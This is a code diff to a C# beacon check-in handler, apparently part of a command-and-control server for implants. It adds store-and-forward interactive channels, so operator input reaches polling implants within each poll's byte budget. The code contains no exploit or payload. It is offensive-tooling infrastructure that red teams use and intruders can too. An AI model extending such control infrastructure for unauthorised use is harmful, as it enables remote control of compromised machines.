@@ -90,6 +90,7 @@ internal sealed class EnvelopeBeaconCheckIn
     private readonly TimeProvider _clock;
     private readonly IPayloadStore _payloads;
     private readonly EnvelopeCheckInKeys _checkInKeys;
+    private readonly Rod.Transport.Channels.DegradedChannelHub _degraded;
 
     public EnvelopeBeaconCheckIn(
         HandshakeService handshake,
@@ -100,7 +101,8 @@ internal sealed class EnvelopeBeaconCheckIn
         IAuditStore audit,
         TimeProvider clock,
         IPayloadStore payloads,
-        EnvelopeCheckInKeys checkInKeys)
+        EnvelopeCheckInKeys checkInKeys,
+        Rod.Transport.Channels.DegradedChannelHub degraded)
     {
         _handshake = handshake;
         _sessions = sessions;
@@ -111,6 +113,7 @@ internal sealed class EnvelopeBeaconCheckIn
         _clock = clock;
         _payloads = payloads;
         _checkInKeys = checkInKeys;
+        _degraded = degraded;
     }
 
     public async Task<IResult> HandleAsync(HttpContext http, CancellationToken cancellationToken)
@@ -294,10 +297,11 @@ internal sealed class EnvelopeBeaconCheckIn
             outbound.AddRange(await _tasking.StagedChunkRunAsync(pull.Value, cancellationToken));
 
         // Dispatch queued tasking while the budget lasts. The claim
-        // evaluation every poll carrier runs decides what fits: the envelope
-        // declares no channel support, so a channel task is requeued
-        // untouched and ends the drain (architecture.md Sec 10.3) -- it parks
-        // at the queue head for a stream transport to claim.
+        // evaluation every poll carrier runs decides what fits: a channel
+        // verb claims only under the degraded discipline -- the session's
+        // opt-in -- and without it parks at the queue head for a stream
+        // transport to claim (architecture.md Sec 10.3).
+        var degraded = session.Capabilities.Contains(Channels.DegradedChannelHub.Capability);
         var budget = MaxDispatchBytes;
         while (true)
         {
@@ -309,7 +313,7 @@ internal sealed class EnvelopeBeaconCheckIn
             var wireSize = EnvelopeFraming.WireSize(frame);
 
             if (TransportCapabilities.EvaluateClaim(
-                    TransportCapabilities.Envelope, dispatched.Verb, wireSize, budget)
+                    TransportCapabilities.Envelope, dispatched.Verb, wireSize, budget, degraded)
                 != ClaimDecision.Claim)
             {
                 await _tasks.RequeueAsync(dispatched.TaskId, CancellationToken.None);
@@ -319,6 +323,16 @@ internal sealed class EnvelopeBeaconCheckIn
             budget -= wireSize;
             outbound.Add(frame);
             await _tasking.RecordDispatchAsync(dispatched, cancellationToken);
+        }
+
+        // The store-and-forward half: parked operator input rides after the
+        // tasking, as ChannelInput frames within the budget the tasking left
+        // -- the poll cycle's answer to the live stream's input pump. The
+        // sweep on the way closes channels the implant stopped collecting.
+        if (degraded)
+        {
+            await _degraded.SweepIdleAsync(cancellationToken);
+            outbound.AddRange(_degraded.Drain(session.Implant, budget));
         }
 
         return Reply(outbound);
